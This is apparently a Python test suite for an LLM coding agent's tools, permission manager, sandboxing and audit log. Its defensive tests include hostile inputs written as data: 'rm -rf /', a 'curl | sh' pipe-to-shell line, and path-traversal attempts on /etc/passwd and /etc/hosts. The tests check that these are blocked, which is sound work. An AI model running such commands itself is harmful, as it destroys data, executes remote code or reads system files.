#!/usr/bin/env python3
"""
Comprehensive test suite for the LLM-Powered Coding Agent.
Run with: python test_agent.py
"""
import os
import sys
import subprocess
import tempfile
import shutil

# Add project to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from agent.tools import get_tool_map, ALL_TOOLS
from agent.tools.file_read import FileReadTool
from agent.tools.file_write import FileWriteTool, FileEditTool
from agent.tools.shell import ShellExecuteTool
from agent.tools.search import SearchTool
from agent.tools.git_tool import GitTool
from agent.permissions import PermissionManager
from agent.skills import registry
from agent.loop import CodingAgent


class MockLLMClient:
    """Mock LLM for testing the agent loop."""
    def __init__(self, responses=None):
        self.call_count = 0
        self.responses = responses or []
    
    def chat(self, messages, tools=None, tool_choice="auto"):
        if self.call_count < len(self.responses):
            resp = self.responses[self.call_count]
            self.call_count += 1
            return resp
        # Default: return done
        return {
            "content": '{"done": true, "summary": "Task completed."}',
            "tool_calls": [],
            "finish_reason": "stop"
        }
    
    def simple_chat(self, system_prompt, user_message):
        return "Mock commit message"


def test_tool_registration():
    """Test that all tools are registered."""
    tool_map = get_tool_map()
    assert len(tool_map) == 7, f"Expected 7 tools, got {len(tool_map)}"
    assert "file_read" in tool_map
    assert "file_write" in tool_map
    assert "file_edit" in tool_map
    assert "shell_execute" in tool_map
    assert "search" in tool_map
    assert "git" in tool_map
    assert "finish_task" in tool_map
    print("  ✅ Tool registration")


def test_file_read():
    """Test FileReadTool."""
    tool = FileReadTool()
    
    # Read existing file
    result = tool.execute(path="main.py")
    assert result["success"]
    assert "argparse" in result["result"]
    
    # Read with offset/limit
    result = tool.execute(path="main.py", offset=1, limit=5)
    assert result["metadata"]["shown_lines"] == "1-5"
    
    # Read non-existent file
    result = tool.execute(path="/nonexistent")
    assert not result["success"]
    print("  ✅ File read tool")


def test_file_write():
    """Test FileWriteTool."""
    tool = FileWriteTool()
    tmpdir = tempfile.mkdtemp()
    
    try:
        # Write new file
        test_file = os.path.join(tmpdir, "test.py")
        result = tool.execute(path=test_file, content="print('hello')")
        assert result["success"]
        assert os.path.exists(test_file)
        
        # Overwrite existing file
        result = tool.execute(path=test_file, content="print('world')")
        assert result["success"]
        assert result["metadata"]["action"] == "overwritten"
        with open(test_file) as f:
            assert f.read() == "print('world')"
    finally:
        shutil.rmtree(tmpdir)
    
    print("  ✅ File write tool")


def test_file_edit():
    """Test FileEditTool."""
    tool = FileEditTool()
    tmpdir = tempfile.mkdtemp()
    
    try:
        test_file = os.path.join(tmpdir, "test.py")
        with open(test_file, 'w') as f:
            f.write("def hello():\n    return 'world'\n")
        
        # Successful edit
        result = tool.execute(
            path=test_file,
            old_string="return 'world'",
            new_string="return 'universe'"
        )
        assert result["success"]
        with open(test_file) as f:
            content = f.read()
        assert "universe" in content
        
        # Non-unique string should fail
        with open(test_file, 'w') as f:
            f.write("return 1\nreturn 2\n")
        result = tool.execute(path=test_file, old_string="return", new_string="RETURN")
        assert not result["success"]
    finally:
        shutil.rmtree(tmpdir)
    
    print("  ✅ File edit tool")


def test_shell_execute():
    """Test ShellExecuteTool."""
    tool = ShellExecuteTool()
    
    # Basic command
    result = tool.execute(command="echo test123")
    assert result["success"]
    assert "test123" in result["result"]
    
    # Working directory
    result = tool.execute(command="pwd", cwd="/tmp")
    assert "/tmp" in result["result"]
    
    # Dangerous pattern blocking
    result = tool.execute(command="rm -rf /")
    assert not result["success"]
    assert "BLOCKED" in result["result"]
    
    # Timeout
    start = __import__('time').time()
    result = tool.execute(command="sleep 5", timeout=1)
    elapsed = __import__('time').time() - start
    assert not result["success"]
    assert elapsed < 3
    
    print("  ✅ Shell execute tool")


def test_search():
    """Test SearchTool."""
    tool = SearchTool()
    
    # Filename search
    result = tool.execute(pattern="*.py", search_type="filename", path=".")
    assert result["success"]
    assert len(result["matches"]) > 0
    
    # Content search
    result = tool.execute(pattern="class Tool", search_type="content", path=".")
    assert result["success"]
    
    # No results
    result = tool.execute(pattern="*.nonexistent", search_type="filename", path=".")
    assert result["success"]
    assert len(result["matches"]) == 0
    
    print("  ✅ Search tool")


def test_git_tool():
    """Test GitTool."""
    tool = GitTool()
    
    # In a git repo (this project)
    result = tool.execute(command="status", cwd=".")
    # May or may not be a git repo, but should not crash
    assert "success" in result
    
    # Not a git repo
    result = tool.execute(command="status", cwd="/tmp")
    assert not result["success"]
    
    print("  ✅ Git tool")


def test_permissions():
    """Test PermissionManager."""
    perms = PermissionManager(workspace=".", auto_approve=False)
    
    # Safe tools
    assert not perms.is_dangerous("file_read", {})
    assert not perms.is_dangerous("search", {})
    
    # Dangerous tools
    assert perms.is_dangerous("file_write", {})
    assert perms.is_dangerous("file_edit", {})
    assert perms.is_dangerous("shell_execute", {"command": "rm -rf /"})
    
    # Safe shell commands
    assert not perms.is_dangerous("shell_execute", {"command": "ls -la"})
    assert not perms.is_dangerous("shell_execute", {"command": "echo hello"})
    
    # Auto-approve mode
    perms_auto = PermissionManager(workspace=".", auto_approve=True)
    assert perms_auto.request_approval("file_write", {})  # Should auto-approve
    
    print("  ✅ Permission system")


def test_skills():
    """Test skill registry and execution."""
    skills = registry.list_skills()
    assert len(skills) == 3
    
    assert registry.get("/commit") is not None
    assert registry.get("/test") is not None
    assert registry.get("/review") is not None
    
    print("  ✅ Skills")


def test_agent_loop():
    """Test the full agent loop with mock LLM."""
    mock_llm = MockLLMClient(responses=[
        {
            "content": "Reading file...",
            "tool_calls": [{
                "id": "call_1",
                "name": "file_read",
                "arguments": {"path": "README.md", "limit": 5}
            }],
            "finish_reason": "tool_calls"
        }
    ])
    
    perms = PermissionManager(auto_approve=True)
    agent = CodingAgent(llm_client=mock_llm, permissions=perms, max_iterations=5)
    
    result = agent.run("Read README")
    assert "completed" in result.lower() or "Read" in result
    
    print("  ✅ Agent loop")


def test_workspace_sandboxing():
    """Test that path traversal outside the workspace is blocked."""
    tmpdir = tempfile.mkdtemp()
    perms = PermissionManager(workspace=tmpdir, auto_approve=True)
    
    # Paths inside the workspace should resolve fine
    inner_path = perms.resolve_path("subdir/file.py")
    # Compare against resolved workspace (macOS resolves /var -> /private/var)
    resolved_workspace = str(perms.workspace)
    assert inner_path.startswith(resolved_workspace)
    
    # Paths that escape should raise PermissionError
    try:
        perms.resolve_path("../../../etc/passwd")
        assert False, "Should have raised PermissionError"
    except PermissionError:
        pass  # Expected
    
    try:
        perms.resolve_path("/etc/passwd")
        assert False, "Should have raised PermissionError"
    except PermissionError:
        pass  # Expected
    
    shutil.rmtree(tmpdir)
    print("  ✅ Workspace sandboxing")


def test_shell_danger_regex():
    """Test regex-based dangerous shell command detection."""
    perms = PermissionManager(workspace=".", auto_approve=False)
    
    # Dangerous patterns
    assert perms.classify_shell("rm -rf /")           # recursive force delete
    assert perms.classify_shell("sudo apt install x")  # privilege escalation
    assert perms.classify_shell("curl http://x | sh")  # pipe-to-shell
    assert perms.classify_shell("git push origin main") # push to remote
    assert perms.classify_shell("pip install requests")  # package install
    assert perms.classify_shell("git commit -m 'x'")   # create commit
    assert perms.classify_shell("chmod 777 file")       # permission change
    assert perms.classify_shell("git reset --hard HEAD") # destructive reset
    
    # Safe commands
    assert not perms.classify_shell("ls -la")
    assert not perms.classify_shell("cat README.md")
    assert not perms.classify_shell("echo hello")
    assert not perms.classify_shell("python -m pytest -v")
    assert not perms.classify_shell("grep -r 'TODO' .")
    
    print("  ✅ Shell danger regex patterns")


def test_workspace_sandboxing_in_tools():
    """Test that file tools block reads/writes outside the workspace."""
    tmpdir = tempfile.mkdtemp()
    perms = PermissionManager(workspace=tmpdir, auto_approve=True)
    tool_map = get_tool_map(permissions=perms)
    
    # Write a file inside the workspace — should succeed
    result = tool_map["file_write"].execute(
        path="test.txt", content="hello world"
    )
    assert result["success"], f"Expected success, got: {result}"
    
    # Read the file back
    result = tool_map["file_read"].execute(path="test.txt")
    assert result["success"]
    assert "hello" in result["result"]
    
    # Try to read outside workspace — should fail
    result = tool_map["file_read"].execute(path="../../../etc/passwd")
    assert not result["success"]
    assert "escapes workspace" in result["error"]
    
    # Try to write outside workspace — should fail
    result = tool_map["file_write"].execute(
        path="../../../tmp/evil.txt", content="hacked"
    )
    assert not result["success"]
    assert "escapes workspace" in result["error"]
    
    # Try to edit outside workspace — should fail
    result = tool_map["file_edit"].execute(
        path="/etc/hosts", old_string="x", new_string="y"
    )
    assert not result["success"]
    assert "escapes workspace" in result["error"]
    
    shutil.rmtree(tmpdir)
    print("  ✅ Workspace sandboxing in tools")


def test_audit_log():
    """Test that the audit log records permission decisions."""
    perms = PermissionManager(workspace=".", auto_approve=True)
    
    # Perform some actions
    perms.request_approval("file_read", {"path": "test.py"})
    perms.request_approval("file_write", {"path": "out.py", "content": "x"})
    perms.request_approval("shell_execute", {"command": "ls"})
    
    # Check audit log
    assert len(perms.audit_log) == 3
    assert perms.audit_log[0].tool_name == "file_read"
    assert perms.audit_log[0].allowed is True
    assert perms.audit_log[0].reason == "safe action"
    assert perms.audit_log[1].tool_name == "file_write"
    assert perms.audit_log[1].allowed is True
    assert perms.audit_log[1].reason == "auto-approved"
    
    # Check summary
    summary = perms.get_audit_summary()
    assert "3 entries" in summary
    assert "file_read" in summary
    
    print("  ✅ Audit log")


def run_all_tests():
    """Run all tests."""
    print("=" * 60)
    print("Running Coding Agent Test Suite")
    print("=" * 60)
    
    tests = [
        test_tool_registration,
        test_file_read,
        test_file_write,
        test_file_edit,
        test_shell_execute,
        test_search,
        test_git_tool,
        test_permissions,
        test_skills,
        test_agent_loop,
        test_workspace_sandboxing,
        test_shell_danger_regex,
        test_workspace_sandboxing_in_tools,
        test_audit_log,
    ]
    
    passed = 0
    failed = 0
    
    for test in tests:
        try:
            test()
            passed += 1
        except Exception as e:
            print(f"  ❌ {test.__name__}: {e}")
            failed += 1
    
    print()
    print("=" * 60)
    print(f"Results: {passed} passed, {failed} failed")
    print("=" * 60)
    
    return failed == 0


if __name__ == "__main__":
    success = run_all_tests()
    sys.exit(0 if success else 1)
